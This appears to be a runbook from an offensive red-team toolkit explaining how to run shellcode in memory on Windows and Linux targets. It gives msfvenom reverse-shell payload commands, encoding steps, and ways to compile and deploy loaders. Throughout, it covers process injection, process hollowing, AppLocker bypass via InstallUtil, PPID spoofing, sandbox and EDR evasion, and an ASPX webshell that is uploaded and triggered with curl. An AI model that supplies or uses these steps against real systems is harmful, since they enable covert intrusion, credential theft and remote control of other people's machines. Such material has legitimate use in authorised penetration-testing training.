# Loaders Runbook

> How to get your shellcode executing in memory. Choose based on your constraints.

---

## Loader Selection Matrix

| Constraints | Recommended Loader | Section |
|-------------|-------------------|---------|
| No restrictions | `shellcode-runners/simple-runner.cs` | XOR, runs in own process |
| Want to blend into existing process | `process-injection/basic-injection.cs` | XOR, injects into explorer/spoolsv |
| Want process to appear as svchost | `process-hollowing/hollow.cs` | XOR, hollows svchost.exe |
| AppLocker blocking .exe | `shellcode-runners/clrunner.cs` | AES, via InstallUtil |
| AppLocker + inject into process | `process-injection/clinject.cs` | AES, via InstallUtil |
| AppLocker + process hollow + PPID spoof | `process-hollowing/clhollow.cs` | AES + PPID, via InstallUtil |
| Sections-based (no VirtualAllocEx) | `sections-injection/sections-runner.cs` | XOR, NtCreateSection |
| Spoof parent PID | `ppid-spoof/PPIDSpoofDropper.cs` | PS base64 dropper |
| Already have webshell | `webshells/ASPX_Inject64.aspx` | AES, injects from web |
| Linux target | `linux/simpleLoader.c` | XOR, C loader |
| DLL side-loading | `dll-runners/DLL_Runner.cs` | XOR |

---

## Payload Preparation (Required Before Any Loader)

### Step 1: Generate Raw Shellcode
```bash
# Staged meterpreter (small, needs listener to send stage)
msfvenom -p windows/x64/meterpreter/reverse_tcp \
         LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread \
         -f raw -o shell.bin

# Stageless (bigger, self-contained)
msfvenom -p windows/x64/meterpreter_reverse_tcp \
         LHOST=<KALI_IP> LPORT=443 EXITFUNC=thread \
         -f raw -o shell.bin
```

### Step 2: Encode/Encrypt
```bash
# XOR encode (for simple-runner, hollow, basic-injection)
python3 04-encoders/xor/xor_encoder.py shell.bin 0xfa --format csharp

# AES encrypt (for clrunner, clinject, clhollow, webshells)
python3 04-encoders/aes/shellcode_encoder.py shell.bin <KEY> aes -cs
# This outputs: encrypted buf[], AES key, IV → paste into loader

# Convert PE to shellcode (for running .exe tools in memory)
04-encoders/donut/donut -f 1 -i Mimikatz.exe -o shell.bin
# Then XOR or AES encode the resulting shell.bin
```

### Step 3: Embed in Loader
- Copy the byte array output into the `buf = new byte[] {...}` section of your chosen loader
- For AES loaders: also update `MyKey` and `Myiv` with the new key/IV

### Step 4: Compile (Do this on your Windows Visual Studio dev box)

> **Why Visual Studio?** Compiling on Kali ARM with `mcs` or cross-compiling is unreliable for most of these loaders. Use a Windows dev box with Visual Studio.

#### Standard Loader (Console App — covers most loaders in this repo)

1. Open Visual Studio on your Windows dev box
2. **File → New → Project → Console App (.NET Framework)** (NOT .NET Core / .NET 5+)
   - Name: match the output name you want (e.g. `loader`, `clrunner`, `inject`)
   - Framework: **.NET Framework 4.8**
   - Click Create
3. Delete all the auto-generated code in the editor
4. Paste in the full contents of your `.cs` file
5. **Project → [Project Name] Properties → Build tab:**
   - Platform target: **x64** (not "Any CPU")
   - Check **"Allow unsafe code"**
6. **Build → Build Solution** (`Ctrl+Shift+B`)
7. Output at: `bin\x64\Debug\YourName.exe` — copy this to your target

#### DLL Loader (Class Library — for `DLL_Runner.cs` and `regsvcs-bypass.cs`)

1. **File → New → Project → Class Library (.NET Framework)** (NOT .NET Core / .NET 5+)
   - For `DLL_Runner.cs`: Name MUST be **`ClassLibrary1`** (the loader script calls this exact name)
   - Framework: **.NET Framework 4.8**
2. Delete Class1.cs defaults, paste in your file
3. **Project → Properties → Build:**
   - Platform target: **x64**
   - Check **"Allow unsafe code"**
4. **Build → Build Solution**
5. Output: `bin\x64\Debug\ClassLibrary1.dll`

#### With Assembly References (AMSI bypass, CLM bypass, psbypass, SQL tools)

After creating the project (step 1-2 above):
- **Right-click References → Add Reference → Browse**
- **For PowerShell/AMSI/CLM (`System.Management.Automation.dll`):**
  Browse to: `C:\Windows\assembly\GAC_MSIL\System.Management.Automation\1.0.0.0__31bf3856ad364e35\System.Management.Automation.dll`
- **For SQL tools (`System.Data.dll`):**
  Browse → find `System.Data.dll` (usually in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\`)
- **For Regasm bypass (`System.EnterpriseServices.dll`):**
  Right-click References → Add Reference → Assemblies tab → check `System.EnterpriseServices`

Then continue from step 4 (Build → Properties) as above.

---

**Alternative — csc.exe (Windows command line, if VS is not available):**
```cmd
:: Standard loader
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /platform:x64 /out:loader.exe loader.cs

:: With SQL reference
csc.exe /unsafe /platform:x64 /r:System.Data.dll /out:mssql.exe mssql.cs

:: With PS reference
csc.exe /unsafe /platform:x64 /r:System.Management.Automation.dll /out:psbypass.exe psbypass.cs

:: As DLL
csc.exe /unsafe /platform:x64 /target:library /out:runner.dll DLL_Runner.cs
```

---

## Shellcode Runner (`shellcode-runners/simple-runner.cs`)

**Simplest loader.** Runs shellcode in the current process with no injection.

```
Process: loader.exe (spawned by you or phishing)
         ↓
   VirtualAlloc (RWX memory)
         ↓
   Copy decoded shellcode
         ↓
   CreateThread (execute at shellcode address)
         ↓
   Meterpreter callback
```

**Best for:** Quick testing, no AV, understanding the basics.
**Weakness:** Process dies if loader dies. AMSI may catch PS if loading via PS.

---

## Process Injection (`process-injection/basic-injection.cs`)

**Injects shellcode into an existing process.**

```
Existing process: explorer.exe / spoolsv.exe / notepad.exe
                         ↓
OpenProcess (PROCESS_ALL_ACCESS handle)
                         ↓
VirtualAllocEx (allocate RWX memory in REMOTE process)
                         ↓
WriteProcessMemory (copy shellcode to remote process)
                         ↓
CreateRemoteThread (create thread in remote process at shellcode)
                         ↓
Meterpreter runs in explorer.exe context
```

**Best for:** Blending in with existing processes, persistence if target process is stable.
**Note:** Auto-selects target based on elevation:
- Elevated (admin) → `spoolsv.exe` (more privileged, less suspicious)
- Not elevated → `explorer.exe` (always running as user)
- Or specify process name as argument: `.\basic-injection.exe explorer`

---

## Process Hollowing (`process-hollowing/hollow.cs`)

**Creates a new process in suspended state and replaces its code.**

```
CreateProcess("svchost.exe", CREATE_SUSPENDED)
                    ↓
ZwQueryInformationProcess (get PEB address)
                    ↓
Read PEB → find executable base address
                    ↓
Parse PE headers → find entrypoint RVA
                    ↓
WriteProcessMemory (overwrite entrypoint with shellcode)
                    ↓
ResumeThread (svchost.exe runs OUR shellcode)
```

**Why this works:** The process object (svchost.exe) looks legitimate to Task Manager,
but it's actually executing our shellcode from the very start.

**Best for:** When you need process masquerading. Appears as svchost.exe in process list.

---

## Sections Injection (`sections-injection/sections-runner.cs`)

**Creates shared memory sections between processes — no VirtualAllocEx.**

```
NtCreateSection (create shared RWX section)
        ↓
NtMapViewOfSection LOCAL process (RW access - write shellcode)
        ↓
NtMapViewOfSection REMOTE process (RX access - execute)
        ↓
Marshal.Copy shellcode to LOCAL mapping
  (automatically reflected in REMOTE mapping — same physical memory)
        ↓
CreateRemoteThread to execute at remote mapping address
```

**Why this is better:** Avoids `VirtualAllocEx` + `WriteProcessMemory` — the standard
"injection" API pattern that EDRs watch for. Uses NT-level syscalls instead.

---

## Disk-Based AES Loaders (`clrunner`, `clinject`, `clhollow`)

**AppLocker bypass + AES encryption = your toolbox for locked-down environments.**

### How They All Work

1. AES-encrypted shellcode embedded at compile time (static bytes, no signature)
2. Sleep-based sandbox detection
3. Accept IP/port via command line or InstallUtil parameters
4. Decrypt shellcode at runtime (in memory only, never written to disk)
5. Replace IP/port placeholder bytes in decrypted shellcode
6. Execute via VirtualAlloc + CreateThread (or injection/hollowing)

### AES Key Setup
The default key/IV in all three loaders:
```
Key: 0C-58-A2-82-30-1A-B6-32-11-90-A6-75-67-2C-7B-8E-13-71-A9-C2-70-B1-9C-23-0F-E8-45-70-BF-B6-6A-EA
IV:  44-CB-82-7D-67-4D-2B-18-A9-64-5E-40-57-85-2B-C9
```
**CHANGE THESE** before use — default keys are known. Generate new ones:
```python
import secrets
key = '-'.join(f'{b:02X}' for b in secrets.token_bytes(32))
iv  = '-'.join(f'{b:02X}' for b in secrets.token_bytes(16))
```

### The IP/Port Placeholder Trick
The encrypted shellcode contains placeholder bytes:
- `11-11-11-11` = placeholder for LHOST IP (4 bytes)
- `22-22` = placeholder for LPORT (2 bytes)

When you pass IP/port at runtime, the loader:
1. Decrypts shellcode
2. Converts IP `192.168.49.67` → hex bytes `C0-A8-31-43`
3. Converts port `443` → hex bytes `01-BB`
4. Replaces placeholders in the decrypted shellcode string
5. Converts back to bytes and executes

**This means you generate ONE binary that works for any IP/port.**

### clrunner.cs — Run in own process
```cmd
# Via InstallUtil (AppLocker bypass)
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false \
  /rhost=192.168.49.67 /rport=443 /U clrunner.exe
```

### clinject.cs — Inject into existing process
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false \
  /rhost=192.168.49.67 /rport=443 /process=explorer /U clinject.exe
```

### clhollow.cs — Process hollow + PPID spoof
```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe \
  /logfile= /LogToConsole=false \
  /rhost=192.168.49.67 /rport=443 \
  /process=svchost.exe /parent=explorer /U clhollow.exe
```

---

## PPID Spoofing (`ppid-spoof/PPIDSpoofDropper.cs`)

**Makes a new process appear as a child of a different parent.**

Normal: `cmd.exe → PowerShell.exe → malware.exe` (suspicious chain)
Spoofed: `malware.exe` appears as child of `notepad.exe` (clean chain)

**How it works:**
1. Find or start `notepad.exe`
2. `InitializeProcThreadAttributeList()` creates extended startup info
3. `UpdateProcThreadAttribute(PROC_THREAD_ATTRIBUTE_PARENT_PROCESS)` sets new parent
4. `CreateProcess()` with `EXTENDED_STARTUPINFO_PRESENT` flag
5. Child process appears as child of notepad in Task Manager / Process Explorer

**Also sets:** `PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON`
This blocks non-Microsoft DLLs from being injected into the spawned process.

---

## Webshells (`webshells/`)

**When you have code execution on a web server (IIS).**

### ASPX_Inject64.aspx — Process Injector Webshell

Drop this on a writable IIS directory. When accessed, it:
1. Sleeps 5s (sandbox evasion)
2. Decrypts AES shellcode
3. Finds the `w3wp` process (IIS worker)
4. Injects shellcode into it

**Configuration at top of file:**
```csharp
string RHOST = "192.168.45.212";  // ← your Kali IP
string RPORT = "53";              // ← your port (use 53/80/443 for firewall bypass)
string TGT_PROC = "w3wp";         // ← process to inject (w3wp = IIS worker, always running)
```

**Deployment:**
```bash
# Find writable web directories
icacls C:\inetpub\wwwroot
icacls C:\inetpub\wwwroot\uploads

# Upload via web request or existing shell
curl -X PUT http://target/upload.aspx -d @ASPX_Inject64.aspx

# Trigger execution by requesting the page
curl http://target/ASPX_Inject64.aspx
```

---

## Linux Loaders (`linux/`)

See `08-linux/loaders/` for the full Linux loader set.

Quick reference:
```bash
# Compile C loader
gcc -o loader simpleLoader.c

# LD_PRELOAD hijack (no root needed if target loads a lib we can replace)
# See 08-linux/loaders/sharedLibrary_LD_PRELOAD.c
```
